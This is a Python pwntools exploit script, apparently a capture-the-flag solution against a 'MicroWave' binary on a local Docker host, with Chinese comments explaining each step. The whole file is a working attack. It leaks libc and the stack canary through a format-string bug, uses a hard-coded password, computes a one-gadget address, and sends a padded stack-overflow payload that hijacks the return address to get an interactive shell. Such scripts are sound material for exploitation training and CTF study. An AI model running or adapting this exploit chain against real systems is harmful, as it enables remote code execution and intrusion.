from pwn import *

context.update(os = 'linux', arch = 'amd64')

io = remote('172.17.0.2', 10001)

io.sendline('1')					#使用功能1触发格式化字符串漏洞
io.recv('username: ')
io.sendline('%p.'*8)				#格式化字符串泄露libc中的地址和canary
io.recvuntil('password: ')
io.sendline('n07_7h3_fl46')			#密码硬编码在程序中，可以直接看到
leak_data = io.recvuntil('[MicroWave]: ').split()[1].split('.')	
leak_libc = int(leak_data[0], 16)
one_gadget_addr = leak_libc - 0x3c3760 + 0x45526		#计算one gadget RCE地址
canary = int(leak_data[5], 16)
log.info('Leak canary = %#x, one gadget RCE address = %#x' %(canary, one_gadget_addr))

payload = "A"*1032					#padding
payload += p64(canary)				#正确的canary
payload += "B"*8					#padding
payload += p64(one_gadget_addr)		#one gadget RCE

io.sendline('2')					#使用有栈溢出的功能2
io.recvuntil('#> ')
io.sendline(payload)

sleep(0.5)				
io.interactive()

